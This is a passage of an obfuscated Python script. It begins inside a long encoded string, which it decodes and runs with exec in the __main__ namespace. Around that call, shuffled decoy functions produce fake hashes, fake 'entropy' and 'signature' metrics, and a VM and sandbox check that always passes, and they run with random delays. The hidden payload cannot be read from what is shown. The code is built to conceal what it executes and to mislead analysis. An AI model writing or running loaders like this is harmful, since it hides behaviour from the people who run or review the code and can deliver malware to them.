u7cPXhd950EHvk+AwiaidydyUzkQsZZHBZofCO10JGsVfocRT2nGnr20BRubvp6kSnoMlZXLgqL/8rBDtelaiNEaWqDl8RgIbW61Oy0hjb/hEja8iMYMKwFN/UgxH3z7qRsSNEWLHlIyurgchh3Y0JRKyWNeARryR3/q4Xycfmo58nMeuDltEPlR8kfBY+Tu7Je+eaia5ooE9eAqUeK3h8rg4O9OENfLe/M9gmGb+lk5OkX0t/1eDMXncSPrhpsUE+t6TlDscBgzL0ncQY+K2PRVc3M83LvYEKjG/WnyTst+LvsILsMNXsPgDx538ojXtQcikuCFykP57/SiUtkAJholT93aq/8HaHrQZMXGIGbd4nQCKdBAVhuxYzGPrs2uknvSHDtFCsKzDnCwERL4jTTICV7jh4vnGq1huBomJBa852deWGQ9EdSaH7nvmokLxyRfcszNczAof+gKW2Mz8aGc+OqPkgUXxDTW8PLYgnHsxFbs0WT00+LQCefy22RlmDUQP8En3RseXV4yW6aPvsNBdA5B8vhdFFrk5wv/NA8bfvc16XMpPL+/FNNkYR9HK7efhjTrLH7LXiaq5iO2J+qKe94jf4V5t/fIjVUdiSm68Ue+N700urgn4rZ1e9su8oSdivtYTigaoWYhwysg3XAL44Hj5ZW56eUkiI8kPoDw8XitLAqGQL7/bcQAyLMroUgISEWOnEd7VNYK5A5h2meGz4w3YhwbhqEt6dGKkEJaEbZBBGEBguUjxw96Jhxx1+FN/JIYXenQSsOcFdfCADeqtZg+j9WOKxh7Hwhsga2uwQHQbE2M7EvW7NODLZd7AU+7FF4ISSmjdEyTad3TL6RlF8eQPJRj+MTQRpYARO6bj5NEVPTBcXQVDo1UoXIGR4FB4yChFrQhR2FuU7vhI8Q56OfFyJt/cHIEZNbSNnCh/ycGj/b9odyOWwfnaNoY1Ymx7I1w4D8Na5uNmgf3YT1dxe31J59cQK/sHV3PG1BeWIfRgTmSCJwziDCjpV9LMjJU+5OZFuIsxsBBvDoPaTKvVQBhyEwU3oezIBFLtqhUy7665uKM081xfl0iYRR4wfEkxowR0mmWGsafoEx3RbvntVYp1m7jkjbhnFzrauZnOWkYSCcCsSOnf9UY6adn3ZmkGmXABn4q5P+HQkSEVqjeOViSbhh6wGOh8AjRwJ/2buETSE7SBtJMcO9SFrCsCLZ483VmpCDdh60QcJf3LxzZspamV/rAlsIqS0Gos0QqCVmZFi2gqvQxuDgRDHn3jz/2GU6rU9uRlnS5uTj83Ra0IrtuMVPPeIt/goXW578+eqF/fnQZA6uQ4i1PCCa1IRDN6JG26yinO792IslqhCCdwMkIPHT3DnZ8qCc1R776FMXLvtDXOWbNWW1iZofluStPAN4FzU81829HukANgkZACYJJCwkIUC8LBL4mY9E5gtEjQ+sxy01ZWqom7QnCfWdiINkZWocO9pnxTAVjjtz4v8JjOIM43N4N7/O5ravyGdNdpZDjIxmhteVHm407OtQ8um/uFnKCanQREubQskIqao725p1hgMiUxg7W6u3ZmD21oH9PhP6LE/p/Oh2xlJ+0nuhGK+obRKaWH/io6+CUGXDnDZb/S5M7VUZ5sDzXdFns2G0gQyaJxQ4Qo1DUUNLY7K+Fo3yiqZT9tTdmA3fck7EX619Boz/+F9qh18qiZbOHWzPBqQ8QmRwjuQezZS3U390qzma+ux6NqDTjm4BV1Qv2KVGXkGG8AArYrGc+xk5dKdDyrzOZzdRwSZl3zJebG1qsxHY8WSCcTZ96Ge4EkNrOYiVClLVA=')
        II0o0Olol0oOo0_OI1lO = lo_oO0l0l0oOl0oOOIl0(ol1OoI0olO0oII0olOO_)
        import __main__ as IoO_Il0O_Il0OOl0oOoO
        IoO_Il0O_Il0OOl0oOoO.__dict__['__file__'] = __file__
        exec(II0o0Olol0oOo0_OI1lO.decode(), IoO_Il0O_Il0OOl0oOoO.__dict__)
    except Exception as e:
        print(f"Execution failed: {str(e)}")
        sys.exit(1)

def OI0oloO0lll0oOOlI0o_():
    fake_key = secrets.token_bytes(32)
    fake_data = base64.b64encode(secrets.token_bytes(2048)).decode()
    time.sleep(random.uniform(0.005, 0.025))
    return hashlib.sha512(fake_data.encode() + fake_key).hexdigest()

def o0Il0OlI_lI0oOoO0loO():
    operations = random.randint(100, 500)
    for i in range(operations):
        _ = secrets.randbits(64) ^ secrets.randbits(64)
        _ = random.randint(0, 2**32) * random.randint(0, 2**16)
    return secrets.token_hex(32)

def oIIo0OlOIoOIl0I1lOIO():
    fake_metrics = {
        'entropy': random.uniform(7.8, 8.0),
        'compression_ratio': random.uniform(0.25, 0.75),
        'pattern_count': random.randint(50, 200),
        'signature_matches': [secrets.token_hex(16) for _ in range(random.randint(3, 12))],
        'complexity_score': random.uniform(0.85, 0.99)
    }
    time.sleep(random.uniform(0.01, 0.05))
    return fake_metrics

def oI0olol1OoIOIl0OIl00():
    fake_vm_checks = [
        'vmware_detection_passed',
        'virtualbox_detection_passed', 
        'qemu_detection_passed',
        'sandbox_detection_passed'
    ]
    return all(check for check in fake_vm_checks)

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=OOO0oIIl1Oo_O0II1lOO, daemon=True)
    monitor_thread.start()
    time.sleep(random.uniform(0.005, 0.1))
    decoy_functions = [OI0oloO0lll0oOOlI0o_, o0Il0OlI_lI0oOoO0loO, oIIo0OlOIoOIl0I1lOIO, oI0olol1OoIOIl0OIl00]
    random.shuffle(decoy_functions)
    execution_pattern = random.randint(1, 4)
    if execution_pattern == 1:
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        lOOIl0OI1lOoIl0O0lI0()
        decoy_functions[1]()
    elif execution_pattern == 2:
        decoy_functions[1]()
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        lOOIl0OI1lOoIl0O0lI0()
    elif execution_pattern == 3:
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        lOOIl0OI1lOoIl0O0lI0()
        decoy_functions[3]()
        decoy_functions[0]()
    else:
        decoy_functions[3]()
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        lOOIl0OI1lOoIl0O0lI0()
        decoy_functions[1]()
